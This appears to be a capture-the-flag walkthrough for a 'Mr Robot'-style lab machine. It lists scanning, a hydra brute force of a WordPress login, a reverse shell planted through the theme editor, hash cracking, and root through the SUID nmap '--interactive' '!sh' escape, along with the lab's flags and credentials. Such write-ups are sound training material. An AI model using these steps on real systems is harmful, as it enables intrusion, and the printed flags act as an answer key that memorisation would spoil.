# Enumuration
- ### RustScan
           port 80 and 443 open
          
- ### Gobuster
   **Useful Files**
    /wp-login.php
   /robots.txt 

- ### Robots.txt
      User-agent: *
      
      fsocity.dic    **This is a wordlist**  
 
      key-1-of-3.txt    **This file has First flag 073403c8a58a1f80d943455fb30724b9**



- ### wp-login.php
      		
we will bruteforce this login page with hydra using given wordlist dictionary fsocity.dic
                
- ### Wordpress CRedentials

  >    **Elliot:ER28-0652**    

# Exploitation

- ## Wordpress 

    ## Version
         
  > it is running wordpress 4.3.1

    ## Reverse Shell
    
 >  we go in editors Tab and insert a php reverse shell in one of the php theme file and get a shell

 >  back as a low priveleged user.

# POst Exploitation
-  ### Enumuration
 
    in home directory we see a user robot and he has our second flag but we cannot read it
 
     a password hash is readable by everyone and it has robot user credentials
 
  >    **robot:c3fcd3d76192e4007dfb496cca67e13b**

  >    **password is abcdefghijklmnopqrstuvwxyz**
-   ### Flag2
       
> ***822c73956184f694993bede3eb39f959***

-  ### Priv ESc
 
 >      find suid binary using   find / -type f -perm -4000 2>/dev/null

       nmap seemed weird

>             nmap --interactive  for nmap cli

>            then type !sh to execute shell and get the root flag



-    ### Root Flag
 
 >        04787ddef27c3dee1ee161b21670b4e4
